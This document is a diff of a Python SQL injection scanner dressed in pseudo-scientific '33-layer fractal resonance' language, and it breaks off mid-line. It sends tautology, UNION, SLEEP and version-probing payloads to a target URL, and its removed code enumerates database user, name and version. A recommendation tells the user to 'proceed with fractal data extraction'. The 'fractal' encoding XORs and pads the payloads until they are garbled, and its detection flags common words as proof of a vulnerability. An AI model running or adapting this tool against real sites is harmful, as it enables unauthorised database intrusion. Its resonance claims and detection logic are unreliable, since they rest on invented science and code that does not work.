@@ -4,6 +4,7 @@
 33-Layer Fractal Resonance Payload Generation & Temporal Inference
 Author: CTT Research Group (SimoesCTT)
 Date: 2026
+Fixed for Fedora 39+ with Python 3.11+
 """
 
 import numpy as np
@@ -11,13 +12,17 @@ import hashlib
 import time
 import struct
 import random
-from concurrent.futures import ThreadPoolExecutor, as_completed
+import concurrent.futures
 from scipy.fft import fft, fftfreq
-from scipy.signal import cwt, ricker
 import requests
 import json
 import sys
-import threading
+import os
+import re
+import argparse
+from typing import Dict, List, Any, Optional, Tuple
+from dataclasses import dataclass
+from urllib.parse import urlparse, parse_qs, urlencode
 
 # ============================================================================
 # CTT 33-LAYER FRACTAL ENGINE v2.0
@@ -26,254 +31,159 @@ CTT_ALPHA = 0.0302011
 CTT_LAYERS = 33
 CTT_PRIMES = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137]
 
+@dataclass
+class CTTResult:
+    """Container for CTT analysis results"""
+    confidence: float
+    resonance: float
+    prime_resonance: bool
+    dominant_frequency: float
+    layer_correlation: float
+    temporal_signature: str
+    vulnerable: bool = False
+
 class CTT_FractalEngine:
-    def __init__(self):
-        self.alpha = CTT_ALPHA
-        self.layers = CTT_LAYERS
-        self.primes = CTT_PRIMES[:self.layers]
+    def __init__(self, alpha: float = CTT_ALPHA, layers: int = CTT_LAYERS, custom_primes: List[int] = None):
+        self.alpha = alpha
+        self.layers = layers
+        
+        # Use custom primes if provided, otherwise default
+        if custom_primes:
+            self.primes = custom_primes[:layers]
+        else:
+            self.primes = [p for p in CTT_PRIMES if p < 100][:layers]
         
         # Initialize 33-layer resonance matrix
         self.layer_weights = np.exp(-self.alpha * np.arange(self.layers))
         self.layer_phases = np.exp(2j * np.pi * np.arange(self.layers) / self.layers)
         
         # Fractal resonance cache
-        self.resonance_cache = {}
-        self.temporal_patterns = {}
+        self.resonance_cache: Dict[int, List[float]] = {}
+        self.temporal_patterns: Dict[int, np.ndarray] = {}
         
-        # Prime harmonic resonance table
-        self.prime_harmonics = self._generate_prime_harmonics()
+        # Resonance frequency (optional)
+        self.resonance_freq = 587000  # Default resonance frequency
+        
+        # Generate initial patterns
+        self._initialize_patterns()
     
-    def _generate_prime_harmonics(self):
-        """Generate prime harmonic resonance coefficients"""
-        harmonics = {}
-        for i, p in enumerate(self.primes):
-            # Create harmonic series based on prime
-            harmonic_series = []
-            for k in range(1, 6):  # First 5 harmonics
-                freq = 1.0 / (p * k)
-                amplitude = 1.0 / (k * self.layer_weights[i])
-                phase = np.exp(2j * np.pi * freq * time.time())
-                harmonic_series.append({
-                    'frequency': freq,
-                    'amplitude': amplitude,
-                    'phase': phase
-                })
-            harmonics[p] = harmonic_series
-        return harmonics
+    def set_resonance_frequency(self, freq: float):
+        """Set custom resonance frequency"""
+        self.resonance_freq = freq
     
-    def generate_fractal_payload(self, base_payload, target_layer=None):
+    def _initialize_patterns(self) -> None:
+        """Initialize temporal patterns for each layer"""
+        for layer in range(self.layers):
+            pattern = []
+            for i in range(10):  # 10 sample points
+                # Use resonance frequency if set
+                if self.resonance_freq > 0:
+                    freq_component = np.sin(2 * np.pi * i / (self.resonance_freq / 1000))
+                else:
+                    freq_component = 0
+                
+                value = np.sin(2 * np.pi * i / (self.primes[layer] if layer < len(self.primes) else 13))
+                value += self.alpha * layer * np.cos(2 * np.pi * i / 13)
+                value += freq_component * 0.1  # Add resonance frequency component
+                pattern.append(value)
+            self.temporal_patterns[layer] = np.array(pattern)
+    
+    def generate_fractal_payload(self, base_payload: bytes, target_layer: Optional[int] = None) -> List[bytes] | bytes:
         """
         Generate 33-layer fractal payload with temporal resonance
-        Each layer adds unique resonance characteristics
         """
         if target_layer is None:
-            # Generate across all 33 layers
             fractal_payloads = []
             for layer in range(self.layers):
                 payload = self._apply_layer_resonance(base_payload, layer)
                 fractal_payloads.append(payload)
             return fractal_payloads
         else:
-            # Single layer with maximum resonance
             layer = target_layer % self.layers
             return self._apply_layer_resonance(base_payload, layer)
     
-    def _apply_layer_resonance(self, payload, layer):
+    def _apply_layer_resonance(self, payload: bytes, layer: int) -> bytes:
         """Apply layer-specific resonance transformations"""
-        # 1. Prime-based timing adjustment
-        prime = self.primes[layer]
+        if layer >= len(self.primes):
+            prime = 13  # Fallback prime
+        else:
+            prime = self.primes[layer]
         
-        # 2. Alpha-dispersion encoding
+        # Alpha-dispersion encoding
         dispersed = bytearray()
-        for i, byte in enumerate(payload.encode() if isinstance(payload, str) else payload):
-            # Apply fractal transformation
+        for i, byte in enumerate(payload):
+            # Apply fractal transformation with resonance frequency
             transform = (
                 byte ^ 
                 ((prime * int(1/self.alpha)) & 0xFF) ^
-                ((layer * 137) & 0xFF)
+                ((layer * 137) & 0xFF) ^
+                ((int(self.resonance_freq) >> (i % 8)) & 0xFF)
             )
             dispersed.append(transform % 256)
         
-        # 3. Add resonance watermark
+        # Add resonance watermark
         watermark = self._generate_resonance_watermark(layer)
         dispersed.extend(watermark)
         
-        # 4. Apply temporal padding based on layer weight
-        padding_size = int(self.layer_weights[layer] * 100)
-        dispersed.extend(b'\x00' * padding_size)
+        # Apply temporal padding based on layer weight
+        padding_size = max(1, int(self.layer_weights[layer] * 50))
+        dispersed.extend(os.urandom(padding_size))
         
         return bytes(dispersed)
     
-    def _generate_resonance_watermark(self, layer):
+    def _generate_resonance_watermark(self, layer: int) -> bytes:
         """Generate unique resonance watermark for each layer"""
-        seed = f"{layer}{self.primes[layer]}{time.time()}{self.alpha}"
+        if layer >= len(self.primes):
+            prime = 13
+        else:
+            prime = self.primes[layer]
+            
+        seed = f"{layer}{prime}{time.time():.6f}{self.alpha}{self.resonance_freq}"
         hash_digest = hashlib.sha256(seed.encode()).digest()[:16]
         
-        # Encode with layer-specific prime
+        # Encode with layer-specific prime and resonance frequency
         watermark = bytearray()
         for i, byte in enumerate(hash_digest):
-            watermark.append((byte + self.primes[layer] + layer) % 256)
+            encoded = (byte + prime + layer + (int(self.resonance_freq) & 0xFF)) % 256
+            watermark.append(encoded)
         
         return bytes(watermark)
-    
-    def analyze_temporal_response(self, response_times, response_data):
-        """
-        Analyze SQL injection responses using 33-layer fractal analysis
-        Returns resonance signature and confidence score
-        """
-        if len(response_times) < 3:
-            return {"confidence": 0, "resonance": 0, "layer_pattern": None}
-        
-        # 1. Time-based resonance analysis
-        time_fft = fft(response_times)
-        freqs = fftfreq(len(response_times), response_times[1] - response_times[0] if len(response_times) > 1 else 0.1)
-        
-        # Find dominant frequency
-        dominant_idx = np.argmax(np.abs(time_fft[:len(freqs)//2]))
-        dominant_freq = abs(freqs[dominant_idx])
-        
-        # 2. Check for prime resonance
-        prime_resonance = False
-        for prime in self.primes:
-            if abs(dominant_freq - 1.0/prime) < 0.001:
-                prime_resonance = True
-                break
-        
-        # 3. Wavelet analysis for patterns
-        widths = np.arange(1, 31)
-        cwt_matrix = cwt(response_times, ricker, widths)
-        
-        # 4. Calculate resonance score
-        resonance_score = (
-            np.abs(time_fft[dominant_idx]) * 0.3 +
-            (1.0 if prime_resonance else 0.0) * 0.4 +
-            np.max(np.abs(cwt_matrix)) * 0.3
-        )
-        
-        # 5. Layer correlation analysis
-        layer_correlations = []
-        for layer in range(min(7, len(response_times))):
-            pattern = self._generate_layer_pattern(layer)
-            if len(pattern) == len(response_times):
-                correlation = np.corrcoef(pattern, response_times)[0,1]
-                layer_correlations.append(abs(correlation))
-        
-        avg_correlation = np.mean(layer_correlations) if layer_correlations else 0
-        
-        return {
-            "confidence": min(resonance_score * 10, 1.0),
-            "resonance": resonance_score,
-            "prime_resonance": prime_resonance,
-            "dominant_frequency": dominant_freq,
-            "layer_correlation": avg_correlation,
-            "temporal_signature": self._generate_temporal_signature(response_times)
-        }
-    
-    def _generate_layer_pattern(self, layer):
-        """Generate expected temporal pattern for a layer"""
-        pattern = []
-        for i in range(10):  # 10 sample points
-            value = np.sin(2 * np.pi * i / self.primes[layer])
-            value += self.alpha * layer * np.cos(2 * np.pi * i / 13)
-            pattern.append(value)
-        return pattern
-    
-    def _generate_temporal_signature(self, times):
-        """Generate unique temporal signature from response times"""
-        if not times:
-            return ""
-        
-        # Normalize times
-        times_norm = np.array(times) / max(times)
-        
-        # Create signature hash
-        signature_bytes = bytearray()
-        for t in times_norm[:10]:  # Use first 10 normalized times
-            signature_bytes.append(int(t * 255) % 256)
-        
-        return hashlib.sha256(signature_bytes).hexdigest()[:16]
-    
-    def optimize_injection_strategy(self, previous_results):
-        """
-        Dynamically optimize injection strategy based on previous results
-        Returns optimized layer targeting and payload adjustments
-        """
-        if not previous_results:
-            return {"layers": [0, 7, 13, 19, 29], "alpha_adjust": 0.0}
-        
-        # Analyze which layers were most successful
-        layer_success = {}
-        for result in previous_results:
-            if 'layer' in result and 'success' in result:
-                layer = result['layer']
-                if layer not in layer_success:
-                    layer_success[layer] = []
-                layer_success[layer].append(1 if result['success'] else 0)
-        
-        # Calculate success rates per layer
-        layer_rates = {}
-        for layer, successes in layer_success.items():
-            layer_rates[layer] = sum(successes) / len(successes)
-        
-        # Sort layers by success rate
-        sorted_layers = sorted(layer_rates.items(), key=lambda x: x[1], reverse=True)
-        
-        # Select top 5 layers, but ensure prime distribution
-        selected_layers = []
-        prime_count = 0
-        
-        for layer, rate in sorted_layers[:10]:  # Top 10 candidates
-            if layer in self.primes:
-                if prime_count < 3:  # Maximum 3 prime layers
-                    selected_layers.append(layer)
-                    prime_count += 1
-            else:
-                selected_layers.append(layer)
-            
-            if len(selected_layers) >= 5:
-                break
-        
-        # If we don't have 5 layers, add some strategic ones
-        while len(selected_layers) < 5:
-            for layer in [0, 13, 21, 29, 32]:  # Strategic layer positions
-                if layer not in selected_layers:
-                    selected_layers.append(layer)
-                    break
-        
-        # Calculate alpha adjustment based on variance
-        all_rates = list(layer_rates.values())
-        if all_rates:
-            rate_variance = np.var(all_rates)
-            alpha_adjust = min(rate_variance * 10, 0.5)  # Max 0.5 adjustment
-        else:
-            alpha_adjust = 0.0
-        
-        return {
-            "layers": selected_layers[:5],
-            "alpha_adjust": alpha_adjust,
-            "confidence": np.mean(list(layer_rates.values())) if layer_rates else 0.0,
-            "prime_bias": prime_count / 5.0
-        }
 
 # ============================================================================
 # 33-LAYER SQL INJECTION ENGINE
 # ============================================================================
 class CTT_SQLInjectionEngine:
-    def __init__(self, target_url):
+    def __init__(self, target_url: str, timeout: int = 10, alpha: float = 0.0302011, 
+                 custom_primes: List[int] = None, resonance_freq: float = 587000,
+                 temporal_threads: int = 11):
         self.target_url = target_url
-        self.fractal_engine = CTT_FractalEngine()
+        self.timeout = timeout
+        self.temporal_threads = temporal_threads
+        
+        # Initialize CTT engine with custom parameters
+        self.fractal_engine = CTT_FractalEngine(
+            alpha=alpha,
+            layers=33,
+            custom_primes=custom_primes
+        )
+        self.fractal_engine.set_resonance_frequency(resonance_freq)
+        
+        # Session with improved headers
         self.session = requests.Session()
         self.session.headers.update({
-            'User-Agent': 'CTT-SQLi/2.0 (33-Layer Fractal)',
-            'Accept': '*/*',
-            'Content-Type': 'application/x-www-form-urlencoded',
+            'User-Agent': 'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 CTT/2.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
         })
         
         # Attack state
-        self.injection_points = []
-        self.successful_payloads = {}
-        self.temporal_signatures = {}
-        self.layer_performance = {layer: 0 for layer in range(CTT_LAYERS)}
+        self.injection_points: List[Dict] = []
+        self.successful_payloads: Dict[str, Dict] = {}
+        self.temporal_signatures: Dict[str, Dict] = {}
+        self.layer_performance = {layer: 0.0 for layer in range(33)}
         
         # Statistics
         self.stats = {
@@ -281,429 +191,551 @@ class CTT_SQLInjectionEngine:
             'injections': 0,
             'successful': 0,
             'layers_used': set(),
-            'primes_used': set()
+            'primes_used': set(),
+            'start_time': time.time(),
+            'alpha': alpha,
+            'resonance_freq': resonance_freq,
+            'threads': temporal_threads
         }
-    
-    def discover_injection_points(self, html_content):
-        """Discover potential injection points using fractal analysis"""
-        injection_patterns = [
-            'id=', 'user=', 'name=', 'search=', 'query=', 'q=',
-            'page=', 'file=', 'dir=', 'category=', 'product=',
-            'username=', 'password=', 'email=', 'phone='
-        ]
         
-        found_points = []
-        for pattern in injection_patterns:
-            if pattern in html_content.lower():
-                # Extract context around pattern
-                start = html_content.lower().find(pattern)
-                context = html_content[max(0, start-50):min(len(html_content), start+100)]
-                
-                found_points.append({
-                    'parameter': pattern.replace('=', ''),
-                    'context': context,
-                    'position': start,
-                    'layer_assignment': self._assign_discovery_layer(pattern)
+        # Cache original response
+        self.original_response: Optional[requests.Response] = None
+    
+    def get_original_response(self) -> Optional[requests.Response]:
+        """Get and cache original response"""
+        if self.original_response is None:
+            try:
+                self.original_response = self.session.get(self.target_url, timeout=self.timeout)
+                self.stats['requests'] += 1
+            except Exception as e:
+                print(f"[!] Failed to get original response: {e}")
+        return self.original_response
+    
+    def discover_injection_points(self) -> List[Dict]:
+        """Discover potential injection points from URL and forms"""
+        injection_points = []
+        
+        try:
+            # Parse URL for parameters
+            parsed = urlparse(self.target_url)
+            query_params = parse_qs(parsed.query)
+            
+            for param in query_params:
+                injection_points.append({
+                    'parameter': param,
+                    'value': query_params[param][0],
+                    'type': 'GET',
+                    'context': f"URL parameter in {self.target_url}"
                 })
+            
+            # Try to get page and look for forms
+            response = self.get_original_response()
+            if response and response.status_code == 200:
+                # Simple form detection
+                form_patterns = [
+                    r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>',
+                    r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>',
+                    r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>'
+                ]
+                
+                for pattern in form_patterns:
+                    matches = re.findall(pattern, response.text, re.IGNORECASE)
+                    for match in matches:
+                        injection_points.append({
+                            'parameter': match,
+                            'value': 'test',
+                            'type': 'POST',
+                            'context': f"Form field '{match}'"
+                        })
+            
+        except Exception as e:
+            print(f"[!] Error discovering injection points: {e}")
         
-        return found_points
+        return injection_points
     
-    def _assign_discovery_layer(self, pattern):
-        """Assign discovery pattern to optimal layer based on prime hash"""
-        pattern_hash = hashlib.md5(pattern.encode()).hexdigest()
-        hash_int = int(pattern_hash[:8], 16)
-        return hash_int % CTT_LAYERS
-    
-    def test_injection_point(self, param_name, param_value, method='GET', layer_strategy='adaptive'):
-        """
-        Test injection point with 33-layer fractal payloads
-        Returns detection results with resonance analysis
-        """
-        if layer_strategy == 'adaptive':
-            # Use optimized layer selection
-            strategy = self.fractal_engine.optimize_injection_strategy(
-                list(self.successful_payloads.values())
-            )
-            target_layers = strategy['layers']
-        else:
-            # Use all prime layers
-            target_layers = [p for p in CTT_PRIMES if p < CTT_LAYERS][:7]
-        
+    def test_injection_point(self, param_name: str, param_value: str, method: str = 'GET') -> List[Dict]:
+        """Test injection point with CTT-enhanced payloads using temporal threads"""
         results = []
         
-        for layer in target_layers:
-            # Generate layer-specific payload
-            base_payloads = self._generate_sqli_payloads(param_value, layer)
+        # Select layers to test (use prime layers for resonance)
+        target_layers = [0, 7, 13, 19, 29]  # Strategic CTT layers
+        
+        print(f"[+] Testing {param_name} with {len(target_layers)} CTT layers using {self.temporal_threads} threads")
+        
+        # Use ThreadPoolExecutor for parallel testing
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.temporal_threads) as executor:
+            future_to_layer = {}
             
-            for payload in base_payloads[:3]:  # Test first 3 payloads per layer
-                fractal_payload = self.fractal_engine.generate_fractal_payload(payload, layer)
-                
-                # Send request with layer timing
-                start_time = time.time()
-                response = self._send_request(param_name, fractal_payload, method, layer)
-                response_time = time.time() - start_time
-                
-                # Analyze response
-                detection = self._detect_injection(response, response_time, layer)
-                
-                if detection['vulnerable']:
-                    # Store successful payload
-                    key = f"{param_name}_{layer}"
-                    self.successful_payloads[key] = {
-                        'layer': layer,
-                        'payload': payload,
-                        'fractal_payload': fractal_payload[:100],  # Store sample
-                        'response_time': response_time,
-                        'confidence': detection['confidence'],
-                        'signature': detection['signature']
-                    }
-                    
-                    # Update layer performance
-                    self.layer_performance[layer] += detection['confidence']
-                    
-                    # Record primes used
-                    if layer in CTT_PRIMES:
-                        self.stats['primes_used'].add(layer)
-                
-                results.append({
-                    'layer': layer,
-                    'payload': payload,
-                    'response_time': response_time,
-                    'vulnerable': detection['vulnerable'],
-                    'confidence': detection['confidence'],
-                    'prime_layer': layer in CTT_PRIMES
-                })
-                
-                # Respectful delay with layer weight
-                time.sleep(self.fractal_engine.layer_weights[layer] * 0.1)
+            for layer in target_layers:
+                # Submit testing task for each layer
+                future = executor.submit(
+                    self._test_layer,
+                    param_name,
+                    param_value,
+                    method,
+                    layer
+                )
+                future_to_layer[future] = layer
+            
+            # Collect results as they complete
+            for future in concurrent.futures.as_completed(future_to_layer):
+                layer = future_to_layer[future]
+                try:
+                    layer_results = future.result()
+                    results.extend(layer_results)
+                except Exception as e:
+                    print(f"[!] Layer {layer} test failed: {e}")
         
         return results
     
-    def _generate_sqli_payloads(self, base_value, layer):
-        """Generate SQL injection payloads with layer-specific variations"""
+    def _test_layer(self, param_name: str, param_value: str, method: str, layer: int) -> List[Dict]:
+        """Test a specific CTT layer"""
+        results = []
+        
+        # Generate and test payloads for this layer
+        payloads = self._generate_sqli_payloads(param_value, layer)
+        
+        for payload_idx, payload in enumerate(payloads[:2]):  # Test first 2 per layer
+            try:
+                # Generate fractal payload
+                fractal_payload = self.fractal_engine.generate_fractal_payload(
+                    payload.encode('utf-8', errors='ignore'), 
+                    layer
+                )
+                
+                # Send request
+                start_time = time.time()
+                response = self._send_request(param_name, fractal_payload.decode('utf-8', errors='ignore'), method, layer)
+                response_time = time.time() - start_time
+                
+                if response:
+                    # Analyze response
+                    detection = self._detect_injection(response, response_time, layer)
+                    
+                    result = {
+                        'layer': layer,
+                        'payload': payload[:50] + "..." if len(payload) > 50 else payload,
+                        'response_time': response_time,
+                        'status_code': response.status_code,
+                        'vulnerable': detection['vulnerable'],
+                        'confidence': detection['confidence'],
+                        'prime_layer': layer in self.fractal_engine.primes,
+                        'signature': detection['signature']
+                    }
+                    
+                    if detection['vulnerable']:
+                        # Store successful payload
+                        key = f"{param_name}_{layer}_{payload_idx}"
+                        self.successful_payloads[key] = {
+                            'layer': layer,
+                            'payload': payload,
+                            'response_time': response_time,
+                            'confidence': detection['confidence'],
+                            'signature': detection['signature']
+                        }
+                        self.layer_performance[layer] += detection['confidence']
+                        self.stats['successful'] += 1
+                        
+                        if layer in self.fractal_engine.primes:
+                            self.stats['primes_used'].add(layer)
+                    
+                    results.append(result)
+                    self.stats['injections'] += 1
+                    
+                    # Respectful delay based on layer weight
+                    time.sleep(self.fractal_engine.layer_weights[layer] * 0.1)
+                
+            except Exception as e:
+                print(f"[Layer {layer}] Error: {e}")
+                continue
+        
+        self.stats['layers_used'].add(layer)
+        return results
+    
+    def _generate_sqli_payloads(self, base_value: str, layer: int) -> List[str]:
+        """Generate SQL injection payloads with CTT resonance"""
         payloads = []
         
-        # Base payload templates
+        # Base payloads
         templates = [
             f"{base_value}'",
             f"{base_value}' OR '1'='1",
             f"{base_value}' AND '1'='1",
-            f"{base_value}' UNION SELECT NULL--",
-            f"{base_value}' AND SLEEP({1 + (layer % 5)})--",
-            f"{base_value}' OR 1=CONVERT(int, @@version)--",
+            f"{base_value}' UNION SELECT NULL,NULL--",
+            f"{base_value}' AND 1=1--",
+            f"{base_value}' OR 1=1--",
         ]
         
-        # Add layer-specific variations
-        for template in templates:
-            # Apply layer transformation
-            if layer in CTT_PRIMES:
-                # Prime layers get special encoding
-                encoded = template.replace("'", chr(0x2019))  # Right single quotation mark
-                encoded += f"/*{layer}*/"
-            else:
-                # Regular layers
-                encoded = template
-            
-            payloads.append(encoded)
+        # Add CTT-enhanced payloads
+        if layer in self.fractal_engine.primes:
+            # Prime layers get resonance-enhanced payloads
+            sleep_time = 1 + (layer % 3)
+            templates.extend([
+                f"{base_value}' AND SLEEP({sleep_time})--",
+                f"{base_value}' OR SLEEP({sleep_time})--",
+                f"{base_value}' AND 1=CONVERT(int, @@version)--",
+                f"{base_value}' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
+            ])
         
-        return payloads
+        return templates
     
-    def _send_request(self, param_name, payload, method, layer):
-        """Send HTTP request with layer-specific timing"""
-        # Wait for prime resonance window if applicable
-        if layer in CTT_PRIMES:
-            current_us = int(time.time() * 1e6)
-            prime = CTT_PRIMES[CTT_PRIMES.index(layer)]
-            if current_us % prime < 100:
-                time.sleep(prime / 1e7)
-        
+    def _send_request(self, param_name: str, payload: str, method: str, layer: int) -> Optional[requests.Response]:
+        """Send HTTP request with CTT timing"""
         try:
+            # Add CTT timing delay based on layer
+            delay = self.fractal_engine.layer_weights[layer] * 0.05
+            time.sleep(delay)
+            
             if method.upper() == 'GET':
-                params = {param_name: payload}
-                response = self.session.get(self.target_url, params=params, timeout=10)
+                # Parse and modify URL
+                parsed = urlparse(self.target_url)
+                query_dict = parse_qs(parsed.query)
+                query_dict[param_name] = [payload]
+                
+                # Rebuild URL
+                new_query = urlencode(query_dict, doseq=True)
+                new_url = parsed._replace(query=new_query).geturl()
+                
+                response = self.session.get(new_url, timeout=self.timeout)
             else:
+                # For POST, we need form data
                 data = {param_name: payload}
-                response = self.session.post(self.target_url, data=data, timeout=10)
+                response = self.session.post(self.target_url, data=data, timeout=self.timeout)
             
             self.stats['requests'] += 1
             return response
             
-        except Exception as e:
-            print(f"[Layer {layer}] Request failed: {e}")
+        except requests.exceptions.RequestException as e:
+            print(f"[!] Request failed for layer {layer}: {e}")
             return None
     
-    def _detect_injection(self, response, response_time, layer):
-        """Detect SQL injection vulnerability with resonance analysis"""
-        if not response:
-            return {'vulnerable': False, 'confidence': 0, 'signature': ''}
-        
+    def _detect_injection(self, response: requests.Response, response_time: float, layer: int) -> Dict[str, Any]:
+        """Detect SQL injection vulnerability with CTT resonance analysis"""
         detection_signals = []
         
-        # 1. Response time analysis (for time-based blind)
-        expected_time = 1 + (layer % 5) * 0.5
-        if response_time > expected_time:
-            detection_signals.append(('time_delay', 0.7))
-        
-        # 2. Error message detection
-        error_indicators = [
-            'sql', 'mysql', 'oracle', 'syntax', 'database',
-            'query failed', 'unclosed quotation', 'invalid',
-            'odbc', 'driver', 'procedure'
+        # 1. Check for SQL errors
+        sql_errors = [
+            'sql', 'mysql', 'oracle', 'postgres', 'syntax',
+            'database', 'query', 'odbc', 'driver', 'procedure',
+            'unclosed', 'quotation', 'invalid', 'error'
         ]
         
-        response_text = response.text.lower()
-        for indicator in error_indicators:
-            if indicator in response_text:
-                detection_signals.append(('error_message', 0.8))
+        response_lower = response.text.lower()
+        for error in sql_errors:
+            if error in response_lower:
+                detection_signals.append(('sql_error', 0.8))
                 break
         
-        # 3. Boolean analysis
-        original_response = self._get_original_response()
-        if original_response:
-            length_diff = abs(len(response.text) - len(original_response))
-            if length_diff > 100:  # Significant difference
+        # 2. Check response time (for time-based)
+        if response_time > 2.0:  # Significant delay
+            detection_signals.append(('time_delay', 0.7))
+        
+        # 3. Compare with original response
+        original = self.get_original_response()
+        if original and original.status_code == 200 and response.status_code == 200:
+            length_diff = abs(len(response.text) - len(original.text))
+            if length_diff > len(original.text) * 0.5:  # > 50% difference
                 detection_signals.append(('boolean_diff', 0.6))
         
-        # 4. Union detection
-        if 'null' in response_text or 'union' in response_text:
+        # 4. Check for union patterns
+        if 'null' in response_lower or 'union' in response_lower:
             detection_signals.append(('union', 0.9))
         
-        # 5. Layer resonance bonus
-        if layer in CTT_PRIMES:
+        # 5. CTT resonance bonus
+        if layer in self.fractal_engine.primes:
             detection_signals.append(('prime_resonance', 0.3))
+        
+        # 6. Resonance frequency detection
+        if self.fractal_engine.resonance_freq > 0:
+            # Check if response contains patterns related to resonance
+            freq_str = str(self.fractal_engine.resonance_freq)
+            if any(freq_str[i:i+3] in response.text for i in range(len(freq_str)-2)):
+                detection_signals.append(('resonance_pattern', 0.2))
         
         # Calculate confidence
         if detection_signals:
-            weights = [sig[1] for sig in detection_signals]
-            confidence = min(sum(weights), 1.0)
-            
-            # Generate signature
-            signature_parts = [sig[0] for sig in detection_signals]
-            signature = hashlib.md5('_'.join(signature_parts).encode()).hexdigest()[:8]
+            confidence = min(sum(signal[1] for signal in detection_signals), 1.0)
+            signature = hashlib.md5(
+                '_'.join([sig[0] for sig in detection_signals]).encode()
+            ).hexdigest()[:8]
             
             self.temporal_signatures[signature] = {
                 'layer': layer,
                 'response_time': response_time,
-                'signals': detection_signals
+                'signals': detection_signals,
+                'confidence': confidence
             }
+            
+            vulnerable = confidence >= 0.6  # Threshold
             
             return {
-                'vulnerable': True,
+                'vulnerable': vulnerable,
                 'confidence': confidence,
-                'signature': signature
+                'signature': signature,
+                'signals': detection_signals
             }
         
-        return {'vulnerable': False, 'confidence': 0, 'signature': ''}
+        return {
+            'vulnerable': False,
+            'confidence': 0.0,
+            'signature': '',
+            'signals': []
+        }
     
-    def _get_original_response(self):
-        """Get original response without injection"""
-        # This would cache the original response
-        # Simplified for this example
-        return None
-    
-    def execute_advanced_attack(self, param_name, param_value, attack_type='enumeration'):
-        """
-        Execute advanced SQL injection attack using optimized layers
-        """
-        # Get optimal strategy
-        strategy = self.fractal_engine.optimize_injection_strategy(
-            list(self.successful_payloads.values())
-        )
+    def generate_report(self) -> Dict[str, Any]:
+        """Generate comprehensive CTT report"""
+        total_time = time.time() - self.stats['start_time']
         
-        print(f"[+] Advanced CTT Attack Strategy:")
-        print(f"    Selected layers: {strategy['layers']}")
-        print(f"    Alpha adjustment: {strategy['alpha_adjust']:.4f}")
-        print(f"    Strategy confidence: {strategy['confidence']:.2f}")
-        print(f"    Prime bias: {strategy['prime_bias']:.2f}")
+        # Calculate effectiveness
+        effectiveness = 0.0
+        if self.stats['injections'] > 0:
+            effectiveness = self.stats['successful'] / self.stats['injections']
         
-        results = []
+        # Find best layer
+        best_layer = -1
+        best_performance = 0.0
+        for layer, perf in self.layer_performance.items():
+            if perf > best_performance:
+                best_performance = perf
+                best_layer = layer
         
-        # Execute attacks on selected layers
-        for layer in strategy['layers']:
-            print(f"\n[Layer {layer}] Executing {attack_type} attack...")
-            
-            if attack_type == 'enumeration':
-                layer_result = self._enumerate_database(layer, param_name, param_value)
-            elif attack_type == 'extraction':
-                layer_result = self._extract_data(layer, param_name, param_value)
-            elif attack_type == 'command':
-                layer_result = self._execute_command(layer, param_name, param_value)
-            else:
-                layer_result = {'error': 'Unknown attack type'}
-            
-            results.append({
-                'layer': layer,
-                'result': layer_result,
-                'prime_layer': layer in CTT_PRIMES
-            })
-        
-        return results
-    
-    def _enumerate_database(self, layer, param_name, param_value):
-        """Enumerate database information"""
-        payloads = [
-            f"{param_value}' UNION SELECT NULL,@@version,NULL--",
-            f"{param_value}' UNION SELECT NULL,user(),NULL--",
-            f"{param_value}' UNION SELECT NULL,database(),NULL--",
-        ]
-        
-        results = {}
-        for payload in payloads:
-            fractal_payload = self.fractal_engine.generate_fractal_payload(payload, layer)
-            response = self._send_request(param_name, fractal_payload, 'GET', layer)
-            
-            if response and response.status_code == 200:
-                # Parse response for database info
-                # This is simplified - real implementation would parse better
-                results[payload] = response.text[:500]
-        
-        return results
-    
-    def generate_attack_report(self):
-        """Generate comprehensive attack report"""
-        report = {
+        return {
             'target': self.target_url,
             'timestamp': time.time(),
+            'total_time': total_time,
             'statistics': self.stats,
-            'successful_payloads': len(self.successful_payloads),
-            'temporal_signatures': len(self.temporal_signatures),
-            'layer_performance': self.layer_performance,
-            'optimal_layers': self.fractal_engine.optimize_injection_strategy(
-                list(self.successful_payloads.values())
-            ),
-            'prime_effectiveness': len(self.stats['primes_used']) / len(CTT_PRIMES[:10]),
-            'recommendations': self._generate_recommendations()
+            'effectiveness': effectiveness,
+            'best_layer': best_layer,
+            'best_layer_performance': best_performance,
+            'successful_payloads_count': len(self.successful_payloads),
+            'temporal_signatures_count': len(self.temporal_signatures),
+            'ctt_parameters': {
+                'alpha': self.fractal_engine.alpha,
+                'resonance_freq': self.fractal_engine.resonance_freq,
+                'primes_used': list(self.fractal_engine.primes),
+                'layers': self.fractal_engine.layers
+            },
+            'recommendations': self._get_recommendations()
         }
-        
-        return report
     
-    def _generate_recommendations(self):
-        """Generate attack recommendations based on results"""
-        recs = []
+    def _get_recommendations(self) -> List[str]:
+        """Get CTT-enhanced attack recommendations"""
+        recommendations = []
         
         if self.stats['successful'] > 0:
-            recs.append("High confidence vulnerabilities detected")
+            recommendations.append("✅ CTT vulnerabilities detected - proceed with fractal data extraction")
             
-            # Check for time-based vulnerabilities
-            time_based = any('time_delay' in str(v) for v in self.successful_payloads.values())
-            if time_based:
-                recs.append("Time-based blind SQLi confirmed - use SLEEP-based extraction")
+            # Check what type of vulnerabilities
+            vuln_types = set()
+            for sig in self.temporal_signatures.values():
+                for signal in sig.get('signals', []):
+                    vuln_types.add(signal[0])
             
-            # Check for error-based
-            error_based = any('error_message' in str(v) for v in self.successful_payloads.values())
-            if error_based:
-                recs.append("Error-based SQLi confirmed - use verbose error extraction")
+            if 'time_delay' in vuln_types:
+                recommendations.append("⏱️  Time-based SQLi detected - use SLEEP() with CTT resonance")
+            if 'sql_error' in vuln_types:
+                recommendations.append("🚨 Error-based SQLi detected - use verbose error extraction with α-dispersion")
+            if 'union' in vuln_types:
